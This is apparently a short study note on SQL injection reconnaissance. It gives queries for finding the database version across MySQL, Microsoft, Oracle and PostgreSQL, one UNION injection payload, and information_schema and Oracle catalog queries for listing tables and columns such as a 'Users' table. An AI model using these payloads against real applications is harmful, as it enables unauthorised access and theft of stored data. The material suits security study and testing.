# Examining the database

### Querying the database type and version

The queries to determine the database version for some popular database types are as follows:

```sql
Database type	Query
Microsoft,MySQL	SELECT @@version
Oracle		SELECT * FROM v$version
PostgreSQL	SELECT version()
```

For example, you could use a UNION attack with the following input: `' UNION SELECT @@version--`

***

### Listing the contents of the database

Most database types (**with the notable exception of Oracle**) have a set of views called the information schema which provide information about the database.

You can query information\_schema.tables to list the tables in the database:

```sql
SELECT * FROM information_schema.tables
```

You can then query information\_schema.columns to list the columns in individual tables:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

#### Equivalent to information schema on Oracle

On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying all\_tables:

```sql
SELECT * FROM all_tables
```

And you can list columns by querying all\_tab\_columns:

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

***
